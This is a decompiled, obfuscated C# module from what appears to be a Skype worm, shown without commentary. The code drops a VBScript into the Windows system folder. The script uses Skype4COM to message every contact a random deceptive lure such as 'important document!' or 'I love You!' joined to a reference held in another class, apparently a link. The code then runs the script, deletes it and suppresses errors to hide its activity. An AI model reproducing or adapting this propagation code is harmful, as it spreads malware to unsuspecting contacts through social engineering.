using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class14
{
	public static void smethod_0()
	{
		string[] array = new string[15];
		VBMath.Randomize();
		array[1] = "LOL Wtf ";
		array[2] = " pervert isnt it? ";
		array[3] = " you wont believe this! ";
		array[4] = " HEHE ";
		array[5] = " this program costs usually about 50$ but i give it out for free :D ";
		array[6] = " Pamela Anderson?! ";
		array[7] = " important document! ";
		array[8] = " do not open , unless you know what'll happen! ";
		array[9] = " this is what you was asking about :) ";
		array[10] = " For Sindy ";
		array[11] = " I love You! ";
		array[12] = " don't even bother ";
		array[13] = " are you scared?! ";
		array[14] = " watch out for those giants monsters ;) ";
		try
		{
			FileStream stream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\s4c.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("on error resume next");
			streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
			streamWriter.WriteLine("Fruxr.Client.Start()");
			streamWriter.WriteLine("Fruxr.Attach()");
			streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
			streamWriter.WriteLine("Fruxr.SendMessage KZN.handle,\"" + array[checked((int)Math.Round(Conversion.Int(14f * VBMath.Rnd()) + 1f))] + "" + Class8.string_0 + "\"");
			streamWriter.WriteLine("next");
			streamWriter.Close();
			Process.Start("C:\\windows\\system32\\s4c.vbs");
			FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\s4c.vbs");
			fileInfo.Delete();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
